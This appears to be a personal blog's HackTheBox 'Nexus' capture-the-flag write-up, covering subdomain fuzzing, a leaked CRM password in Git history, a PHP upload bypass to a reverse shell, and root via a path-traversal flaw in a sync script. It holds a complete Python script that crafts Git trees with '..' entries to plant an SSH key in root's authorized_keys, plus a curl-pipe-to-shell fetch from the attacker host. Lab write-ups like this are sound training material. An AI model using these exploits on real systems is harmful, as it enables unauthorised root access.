@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox — Nexus Writeup — Brandon Mukeni</title>
+  <meta name="description" content="Gaining access on Nexus">
+ 
+  <link rel="icon" href="/favicon-package/favicon.svg" type="image/svg+xml" sizes="any">
+  <link rel="icon" href="/favicon-package/favicon.ico">
+  <link rel="apple-touch-icon" href="/favicon-package/apple-touch-icon.png">
+  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+ 
+  <link rel="stylesheet" href="/assets/css/csscopy.css">
+  <link rel="stylesheet" href="/assets/css/post.css">
+  <link rel="stylesheet" href="/assets/css/mobile_fixes.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+ 
+<body id="top">
+ 
+  <!-- NAV (matches index.html exactly) -->
+  <div class="extended-nav">
+    <div class="logo-nav">
+      <a href="/templates/bcreative_page.html" class="logo">
+        <img src="/images/logo/logo_white.png" width="100" height="20" alt="Brandon Logo" class="logo-light">
+        <img src="/images/logo/logo_teal.png"  width="100" height="20" alt="Brandon Logo" class="logo-dark">
+      </a>
+    </div>
+    <button class="header-action-btn theme-toggle" aria-label="Toggle theme" data-theme-toggler>
+      <ion-icon name="moon-outline" class="moon-icon"></ion-icon>
+      <ion-icon name="sunny-outline" class="sun-icon"></ion-icon>
+    </button>
+  </div>
+ 
+  <header class="header" data-header>
+    <div class="container">
+      <nav class="navbar" data-navbar>
+        <div class="navbar-top">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_white.png" width="100" height="25" alt="Brandon Logo">
+          </a>
+          <button class="nav-close-btn" aria-label="close menu" data-nav-toggler>
+            <ion-icon name="close-outline" aria-hidden="true"></ion-icon>
+          </button>
+        </div>
+        <ul class="navbar-list">
+          <li class="navbar-item"><a href="/index.html"              class="navbar-link" data-nav-link>Home</a></li>
+          <li class="navbar-item"><a href="/templates/aboutme.html"  class="navbar-link" data-nav-link>About Me</a></li>
+          <li class="navbar-item"><a href="/templates/projects.html" class="navbar-link" data-nav-link>Projects</a></li>
+          <li class="navbar-item"><a href="/templates/writeups.html" class="navbar-link" data-nav-link>Write-ups</a></li>
+          <li class="navbar-item"><a href="/templates/contacts.html" class="navbar-link" data-nav-link>Contact</a></li>
+        </ul>
+      </nav>
+      <div class="header-action">
+        <button class="header-action-btn nav-open-btn" aria-label="menu" data-nav-toggler>
+          <ion-icon name="menu-outline" aria-hidden="true"></ion-icon>
+        </button>
+      </div>
+      <div class="overlay" data-nav-toggler data-overlay></div>
+    </div>
+  </header>
+ 
+  <main>
+    <article class="post-article">
+      <div class="container">
+ 
+        <!-- Post header -->
+        <header class="post-header">
+          <div class="post-meta">
+            <span class="post-type-badge">WRITEUP</span>
+            <time datetime="2026-08-03" class="post-date">August 03, 2026</time>
+          </div>
+          <h1 class="post-title">HackTheBox — Nexus Writeup</h1>
+          <p class="post-excerpt">Gaining access on Nexus</p>
+          <div class="post-divider"></div>
+        </header>
+ 
+        <!-- Post body (converted from the markdown) -->
+        <div class="post-content">
+          <h1>Nexus - Writeup</h1>
+<p><strong>Platform:</strong> HackTheBox<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Date completed:</strong> 2026-08-03</p>
+<hr />
+<h1>Overview</h1>
+<p>So, I just wrapped up "Nexus," an easy-medium-difficulty machine on HackTheBox, and man, what a ride. This box is a fantastic playground for understanding how Gitea handles repository configurations and, more importantly, how Git actually structures objects under the hood. The main takeaway here is definitely how dangerous directory traversal can be when automated scripts blindly trust file paths inside Git trees, leading to a neat path traversal exploit that got us root.</p>
+<hr />
+<h2>Enumeration</h2>
+<p>Alright, let's start from the beginning. First things first, I fired up a classic Nmap scan to see what we were dealing with:</p>
+<pre><code class="language-bash">nmap -sC -sV 10.129.234.54
+</code></pre>
+<p>The scan came back showing just two open ports: SSH on port 22 and HTTP on port 80 (running Nginx). Nmap also flagged that it tried to redirect to <code>http://nexus.htb/</code> but failed. This is a classic DNS resolution issue—the target machine doesn't know how to resolve that hostname out of the box. </p>
+<p>To fix this, I simply mapped the IP to the domain name in my local <code>/etc/hosts</code> file:</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>And added the line:</p>
+<pre><code class="language-text">10.129.234.54   nexus.htb
+</code></pre>
+<p><em>(Pro-tip I noted down: you can do this much quicker with <code>sudo sh -c 'echo "nexus.htb  10.129.234.54" &gt;&gt; /etc/hosts'</code> next time!)</em></p>
+<p>Once the hostname was resolved, I poked around the main webpage. Honestly, there wasn’t a whole lot of obvious stuff, but I did manage to harvest two emails that looked interesting: <code>careers@nexus.htb</code> and <code>j.matthew@nexus.htb</code>. Write those down, always useful!</p>
+<p>Since the front page was a bit of a dead end, I figured there had to be some subdomains hiding somewhere. I brought out <code>ffuf</code> to fuzz for subdomains using a top 1 million list, filtering out the noise with <code>-fs 154</code>:</p>
+<pre><code class="language-bash">ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://nexus.htb:80 -H 'Host: FUZZ.nexus.htb' -fs 154
+</code></pre>
+<p>Bingo! It found two subdomains:<br />
+1. <code>git</code> (Status 200)<br />
+2. <code>billing</code> (Status 302)</p>
+<p>I went ahead and added both subdomains to my <code>/etc/hosts</code> file so my browser could actually reach them.</p>
+<p>First, I checked out the <code>git</code> subdomain. It led to a Gitea instance:</p>
+<p><img alt="gitea web screenshot" src="gitea_Screenshot 2026-07-23 153218.png" /></p>
+<p>I started digging around Gitea and found a public repository called <code>krayin-docker-setup</code>. While looking through the files, I noticed an exposed <code>.env</code> file containing some default database passwords. But what really saved the day was looking at the Git commit history. I spotted a deleted line in a previous commit containing a CRM password: <code>N27xh!!2ucY04</code>. </p>
+<p><img alt="crm password on env file" src="git_commit_Screenshot 2026-07-23 155551.png" /></p>
+<p>Now, armed with this password, I headed over to the <code>billing</code> subdomain. I first tried logging in with the default email from the <code>.env</code> file (<code>laravel@krayincrm.com</code>), but no luck. Then I remembered the emails I grabbed earlier. I tried logging in as the hiring manager using <code>j.matthew@nexus.htb</code> and the password <code>N27xh...ucY04</code>... and boom, we were in!</p>
+<p><img alt="jones dashboard" src="krayin_dashboard_Screenshot 2026-07-23 160805.png" /></p>
+<hr />
+<h2>Exploitation</h2>
+<p>The dashboard itself was pretty quiet, but it did show the CRM version: Krayin CRM version 2.2.0. </p>
+<p>I did a bit of research online and discovered that this version is vulnerable to CVE-2026-38526. The key vector here is the <code>POST /admin/tinymce/upload</code> endpoint, which let me execute code and grab an initial shell on the machine.</p>
+<p>The endpoint is on the upload file on the compose email tab. I used burpsuite to inteject the traffic then edit the file contents.</p>
+<p><img alt="tinymce endpoint" src="burp_krayin_enpoint_Screenshot 2026-07-23 184732.png" /></p>
+<p>First I saved a simple php payload with .png extension, then uploaded it via the endpoint. From the interjected traffic, I made some edits and removed the .png to php. If successfull, a reply is sent back with the file location where that file got saved. </p>
+<p><img alt="planting payload" src="bursuite_repeater_section_uploading_php_file_Screenshot 2026-07-23 190116-1.png" /></p>
+<p>Using the GET method executes the payload as shown below:</p>
+<p><img alt="running payload.php" src="burp_get_method_running_php_Screenshot 2026-07-23 190415.png" /></p>
+<p>This was just a simple test to confirm whether I could plant a payload and execute it. Since it was a success, I planted a php reverse shell script. </p>
+<p><img alt="reverse shell instance" src="reverse_shell_php_script_executionScreenshot 2026-07-23 201543.png" /></p>
+<p>Oh, remember you ought to have a listener up based on the specified script's ip and port.</p>
+<p>Once I got the shell, it felt a bit shaky, so I immediately stabilized it using:</p>
+<pre><code class="language-bash">script /dev/null -c /bin/bash
+</code></pre>
+<p>I ran <code>ls -la</code> to check the directory and located the local <code>.env</code> file. Inside, I found another password: <code>y27xb3h...74GbR</code>. </p>
+<p>Next, I checked out <code>/etc/passwd</code> to see who actually lives on this system:</p>
+<pre><code class="language-text">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:988::/var/log/laurel:/bin/false
+jones:x:1000:1000:,,,:/home/jones:/bin/bash
+mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
+git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+</code></pre>
+<p>I saw the user <code>jones</code>. I tried SSHing into <code>jones</code> using that new password (<code>y27xb3ha!!74GbR</code>) and it worked! </p>
+<pre><code class="language-bash">ssh jones@10.129.66.62
+</code></pre>
+<p>We logged in successfully and grabbed <code>user.txt</code>! </p>
+<pre><code class="language-bash">jones@nexus:~$ cat user.txt
+056c2f......................f
+</code></pre>
+<h3>Privilege Escalation</h3>
+<p>Now for the hard part: getting root. I started with my standard manual checks—SUID binaries, cron jobs, active processes—but nothing stood out:</p>
+<pre><code class="language-bash">find /perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<p>Nothing juicy. So, I hosted <code>linpeas.sh</code> on my attacker machine and curled it over:</p>
+<pre><code class="language-bash"># On my machine
+python -m http.server 8888
+
+# On the victim (jones ssh session)
+curl &lt;my_ip&gt;:8888/linpeas.sh | sh
+</code></pre>
+<p>After scanning through the massive Linpeas output, something interesting caught my eye:</p>
+<pre><code class="language-text">Additional timer files: (T1053.003)                                              
+Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer
+  └─ RELATIVE_PATH: Uses relative path in Unit directive
+</code></pre>
+<p>I'll admit, privilege escalation sometimes makes me scratch my head, but seeing this timer pointed me in the right direction. I checked active timers using a command I'm definitely adding to my permanent toolbox:</p>
+<pre><code class="language-bash">systemctl list-timers
+</code></pre>
+<p>This timer triggers <code>gitea-template-sync.service</code> every single minute, which in turn runs a Python script located at <code>/etc/gitea/template-sync.py</code>.</p>
+<p>I spent some time analyzing what this script does:<br />
+1. <code>load_config()</code>: Reads configurations from <code>/etc/gitea/template-sync.conf</code> and <code>/opt/forge/app/.env</code> to retrieve a <code>GITEA_API_TOKEN</code>.<br />
+2. <code>get_template_repos(token)</code>: Searches Gitea's API for repositories marked as <code>template: true</code>.<br />
+3. <code>sync_template(repo_info)</code>: For each template repo, it finds the raw repository path on disk, runs <code>git ls-tree -r HEAD</code> to get all blobs, runs <code>git cat-file blob &lt;hash&gt;</code> to pull their contents, and writes them to a staging directory using <code>os.path.join(stage_path, filepath)</code>.</p>
+<p><strong>The vulnerability:</strong> The script directly joins <code>stage_path</code> and <code>filepath</code> without sanitizing <code>filepath</code> first! Because it doesn't check if the path climbs out of the staging directory, we can use directory traversal (<code>../</code>) to write files absolutely anywhere on the filesystem that the script (running as root) has access to.</p>
+<p>Normally, Gitea and Git won't let you commit files containing <code>..</code> pathing. To bypass this restriction, we have to construct the Git objects (blobs and trees) manually from scratch using a Python script. </p>
+<p>Here’s how Git structures things under the hood:<br />
+* <strong>Blob:</strong> Stores raw file content.<br />
+* <strong>Tree:</strong> Acts like a directory, storing names, permissions, and SHA-1 hashes of blobs or other sub-trees.<br />
+* <strong>Commit:</strong> A snapshot containing metadata pointing to the root tree.</p>
+<p>By writing a custom script, we can generate a tree object that explicitly names a directory entry <code>..</code>. When the synchronization script processes our custom repository, it will recursively join those <code>..</code> directories, escape the staging folder, and write our public SSH key directly into <code>/root/.ssh/authorized_keys</code>.</p>
+<p>I used a custom script (<code>python_git.py</code>) to build this payload structure. Side note: I didn't not fully write the script. I got it from <a href="https://medium.com/@shammasqazi18/htb-nexus-write-up-cccd4354da05">here.</a></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=(&quot;%s %d&quot;%(t,len(data))).encode()+b&quot;\x00&quot;
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(&quot;.git&quot;,&quot;objects&quot;,sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,&quot;wb&quot;).write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return(&quot;%s %s&quot;%(mode,name)).encode()+b&quot;\x00&quot;+bytes.fromhex(sha)
+
+if not os.path.isdir(&quot;.git&quot;):
+    print(&quot;Run inside git repo&quot;);sys.exit(1)
+
+r=subprocess.run([&quot;cat&quot;,&quot;/tmp/mykey.pub&quot;],capture_output=True,text=True)
+if r.returncode!=0:
+    print(&quot;ssh-keygen -f /tmp/mykey -N ''&quot;);sys.exit(1)
+key=r.stdout.strip()+&quot;\n&quot;
+
+blob=write_obj(key.encode(),&quot;blob&quot;)
+readme=write_obj(b&quot;# Template\n&quot;,&quot;blob&quot;)
+ssh_t=write_obj(entry(&quot;100644&quot;,&quot;authorized_keys&quot;,blob),&quot;tree&quot;)
+cur=write_obj(entry(&quot;40000&quot;,&quot;.ssh&quot;,ssh_t),&quot;tree&quot;)
+fir=write_obj(entry(&quot;40000&quot;,&quot;root&quot;,cur),&quot;tree&quot;)
+for i in range(4):
+    fir=write_obj(entry(&quot;40000&quot;,&quot;..&quot;,fir),&quot;tree&quot;)
+root=write_obj(entry(&quot;100644&quot;,&quot;README.md&quot;,readme)+entry(&quot;40000&quot;,&quot;..&quot;,fir),&quot;tree&quot;)
+ts=int(time.time())
+c=&quot;tree %s\nauthor x &lt;x@x&gt; %d +0000\ncommitter x &lt;x@x&gt; %d +0000\n\ninit\n&quot;%(root,ts,ts)
+sha=write_obj(c.encode(),&quot;commit&quot;)
+os.makedirs(os.path.join(&quot;.git&quot;,&quot;refs&quot;,&quot;heads&quot;),exist_ok=True)
+open(os.path.join(&quot;.git&quot;,&quot;refs&quot;,&quot;heads&quot;,&quot;main&quot;),&quot;w&quot;).write(sha+&quot;\n&quot;)
+print(&quot;Done: &quot;+sha)
+</code></pre>
+<p>First, I created a new repository on Gitea using my logged-in user and flagged it as a <strong>template</strong> repository.</p>
+<p><img alt="creating template repo" src="making-rooted-repoScreenshot 2026-07-25 122037.png" /></p>
+<p>Next, on the victim machine inside <code>/tmp</code>, I generated a new SSH keypair:</p>
+<pre><code class="language-bash">ssh-keygen -t ed25519 -f /tmp/mykey -N ''
+</code></pre>
+<p>Then, I cloned my empty template repository to <code>/tmp</code>:</p>
+<pre><code class="language-bash">git clone http://jones:'y27xb3ha....4GbR'@localhost:3000/jones/rooted-repo
+</code></pre>
+<p>I moved into the repository folder, dropped the <code>python_git.py</code> script in, and ran it. It generated the custom Git objects successfully:</p>
+<pre><code class="language-bash">jones@nexus:/tmp/rooted-repo$ python3 ../python_git.py
+Done: efe5055d4196ba1f06bd963212709360710e6624
+</code></pre>
+<p>I noticed that trying to push without a physical <code>README.md</code> file caused the sync execution to fail. To make sure everything pushed correctly, I touched a physical <code>README.md</code> first:</p>
+<pre><code class="language-bash">touch README.md
+</code></pre>
+<p>I checked my custom tree structure using <code>git ls-tree</code> to make sure the traversal path was correctly pointing to the root SSH directory:</p>
+<pre><code class="language-bash">jones@nexus:/tmp/rooted$ git ls-tree -r main
+100644 blob 3ccfeb4c0b22a9f47e1beb3ca9f8111454b043af    ../../../../../root/.ssh/authorized_keys
+100644 blob c296a5f621e8f1d1536d8b671d272a96a5d22a7d    README.md
+</code></pre>
+<p>It looked absolutely perfect. I went ahead and force-pushed it to Gitea:</p>
+<pre><code class="language-bash">git push -u origin main --force
+</code></pre>
+<p>During the push, I saw some "Permission denied" errors:</p>
+<pre><code class="language-text">warning: unable to access '../../../../../root/.gitattributes': Permission denied
+warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
+</code></pre>
+<p>I panicked for a second thinking it failed, but then realized this is actually normal. The user <code>jones</code> doesn't have permissions to read those root-level folders, but the Gitea sync service running as root <em>does</em>. </p>
+<p>I waited a minute for the systemd timer to trigger the Python sync script. Once it ran, I attempted to SSH as root using our generated private key:</p>
+<pre><code class="language-bash">ssh -i /tmp/mykey root@localhost
+</code></pre>
+<p>And... yes! We logged in as root!</p>
+<pre><code class="language-bash">root@nexus:~# cat root.txt
+.............................
+</code></pre>
+<hr />
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>Git Under the Hood:</strong> This lab forced me to learn how Git actually serializes objects (blobs, trees, commits) as zlib-compressed binary files. Truly understanding this made writing the custom path traversal payload actually make sense.</li>
+<li><strong>Path Traversal in Scripts:</strong> Never trust file paths extracted from archives, repositories, or external inputs when running automated tasks with elevated privileges. Always use safety wrappers like verifying the resolved absolute path stays within the intended target directory.</li>
+<li><strong>Systemd Timers:</strong> Paying attention to active systemd timers via <code>systemctl list-timers</code> is a highly effective way to find custom automation scripts that might be running with high privileges.</li>
+</ul>
+<hr />
+<h2>Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong> (Port scanning)</li>
+<li><strong>ffuf</strong> (Subdomain fuzzing)</li>
+<li><strong>Linpeas</strong> (Privilege escalation enumeration)</li>
+<li><strong>Git</strong> (Version control exploitation)</li>
+</ul>
+<hr />
+<p><em>Written by Brandon (Founder BeCreative) . 2026-08-03</em></p>
+        </div>
+ 
+        <!-- Back link -->
+        <div class="post-footer">
+          <a href="/templates/writeups.html" class="btn btn-secondary">
+            ← Back to all writeups
+          </a>
+        </div>
+ 
+      </div>
+    </article>
+  </main>
+ 
+  <!-- FOOTER (matches index.html) -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top section grid-list">
+        <div class="footer-brand">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_teal.png" width="100" height="48" alt="Brandon Logo">
+          </a>
+          <p class="footer-text">Cybersecurity student passionate about technology, security, and innovation.</p>
+        </div>
+        <ul class="footer-list">
+          <p class="footer-list-title">Connect</p>
+          <li><a href="https://github.com/muk-e-ni/"          class="footer-link"><ion-icon name="logo-github"></ion-icon> Github</a></li>
+          <li><a href="https://www.linkedin.com/in/brandon-mukeni-46276236b/" class="footer-link"><ion-icon name="logo-linkedin"></ion-icon> LinkedIn</a></li>
+          <li><a href="https://discord.com/users/1130262077957746739"         class="footer-link"><ion-icon name="logo-discord"></ion-icon> Discord</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Explore</p></li>
+          <li><a href="/templates/projects.html" class="footer-link">Projects</a></li>
+          <li><a href="/templates/writeups.html" class="footer-link">Writeups</a></li>
+          <li><a href="/templates/about.html"    class="footer-link">About</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Contact</p></li>
+          <li class="footer-list-item">
+            <ion-icon name="mail" aria-hidden="true"></ion-icon>
+            <a href="mailto:contact@brandonmukeni.com" class="footer-link">Email Me</a>
+          </li>
+          <li class="footer-list-item">
+            <ion-icon name="location" aria-hidden="true"></ion-icon>
+            <address class="address">Nairobi, Kenya</address>
+          </li>
+        </ul>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 Brandon Mukeni. All rights reserved.</p>
+        <p class="footer-credit">Made with love and bugs</p>
+      </div>
+    </div>
+  </footer>
+ 
+  <a href="#top" class="back-top-btn" aria-label="back to top" data-back-top-btn>
+    <ion-icon name="arrow-up-outline" aria-hidden="true"></ion-icon>
+  </a>
+ 
+  <script src="/assets/js/jscopy.js" defer></script>
+  <script src="/assets/js/theme.js"  defer></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule    src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
